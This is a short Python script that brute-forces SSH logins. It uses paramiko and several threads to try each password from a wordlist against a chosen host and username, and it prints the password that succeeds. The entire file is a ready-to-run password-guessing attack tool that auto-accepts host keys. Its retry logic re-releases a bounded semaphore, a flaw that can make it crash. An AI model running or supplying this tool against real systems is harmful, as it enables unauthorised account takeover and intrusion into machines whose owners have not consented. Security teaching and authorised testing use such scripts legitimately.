import optparse
import time
from threading import BoundedSemaphore, Thread

import paramiko

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


def connect(host, user, password):
    global Found
    global Fails
    try:
        # try to connect
        client = paramiko.SSHClient()
        # adding a policy to accept the host key and prevent being blocked
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=user, password=password, timeout=5)
        print("[+]Password found: " + password)
        Found = True
        client.close()
    except paramiko.AuthenticationException:
        # handle failed authentication silently
        pass
    except paramiko.SSHException as e:
        if "Connection refused" in str(e) or "No route to host" in str(e):
            time.sleep(1)
            connect(host, user, password)
        else:
            Fails += 1
            time.sleep(5)
            connect(host, user, password)
    except Exception as e:
        pass
    finally:
        connection_lock.release()


def main():
    # parser option setup
    parser = optparse.OptionParser(
        "usage %prog " + "-H <target host> -u <user> -f <password list>"
    )
    # add option -H which is the host
    parser.add_option("-H", dest="tgtHost", type="string", help="specify target host")
    # add option -u which is the user
    parser.add_option("-u", dest="tgtUser", type="string", help="specify user")
    # add option -f which is the password file
    parser.add_option(
        "-f", dest="passwdFile", type="string", help="specify password file"
    )
    (options, args) = parser.parse_args()
    # stock everything inside a variable
    tgtHost = options.tgtHost
    tgtUser = options.tgtUser
    passwdFile = options.passwdFile
    # if there s one option that is not fill then print the parser usage
    if (tgtHost == None) or (tgtUser == None) or (passwdFile == None):
        print(parser.usage)
        exit(0)
    # open the password file in read mode and loop through each line
    fn = open(passwdFile, "r")
    for line in fn.readlines():
        if Found:
            print("Exiting : Password Found")
            fn.close()
            exit(0)
        if Fails > 5:
            print("Exiting : Too Many Socket Timeouts")
            fn.close()
            exit(0)
        connection_lock.acquire()
        password = line.strip("\n")
        print("[-] Testing : " + str(password))
        t = Thread(target=connect, args=(tgtHost, tgtUser, password))
        t.start()
    fn.close()


if __name__ == "__main__":
    main()
#     main()
